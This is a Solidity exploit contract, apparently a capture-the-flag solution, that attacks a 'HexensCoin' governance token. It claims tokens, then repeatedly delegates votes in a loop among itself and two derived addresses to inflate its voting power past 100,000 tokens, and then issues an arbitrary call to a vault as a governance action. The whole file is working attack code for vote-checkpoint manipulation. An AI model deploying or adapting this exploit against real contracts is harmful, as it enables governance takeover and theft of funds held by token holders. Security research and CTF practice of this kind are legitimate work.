// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IChallenge {
    function claim() external;
}

interface IHexensCoin {
    function delegate(address delegatee) external;
    function getCurrentVotes(address account) external view returns (uint256);
}

contract VotingExploit {
    address public immutable owner;
    IChallenge public challenge;
    IHexensCoin public hexensCoin;
    
    constructor(address _challenge, address _hexensCoin) {
        owner = msg.sender;
        challenge = IChallenge(_challenge);
        hexensCoin = IHexensCoin(_hexensCoin);
    }

    function exploit() external {
        require(msg.sender == owner, "Only owner");
        
        // Step 1: Initial delegation to ourselves
        // This ensures _delegates[address(this)] is set
        hexensCoin.delegate(address(this));
        
        // Step 2: Claim tokens
        // This will mint 10,000 ether tokens and add voting power
        challenge.claim();
        
        // Step 3: Create a circular delegation pattern
        // Each delegation will create new checkpoints
        address[] memory delegates = new address[](3);
        delegates[0] = address(this);
        delegates[1] = address(uint160(uint256(keccak256(abi.encodePacked("delegate1")))));
        delegates[2] = address(uint160(uint256(keccak256(abi.encodePacked("delegate2")))));

        // Create multiple delegations in a loop
        // Each iteration should increase our voting power
        for (uint i = 0; i < 5; i++) {
            for (uint j = 0; j < delegates.length; j++) {
                hexensCoin.delegate(delegates[j]);
            }
        }

        // Print final voting power for verification
        uint256 finalVotes = hexensCoin.getCurrentVotes(address(this));
        require(finalVotes >= 100_000 ether, "Not enough voting power");
    }

    // Function to execute the governance call once we have enough voting power
    function executeGovernanceCall(address vault, bytes calldata data) external {
        require(msg.sender == owner, "Only owner");
        (bool success,) = vault.call(data);
        require(success, "Governance call failed");
    }
}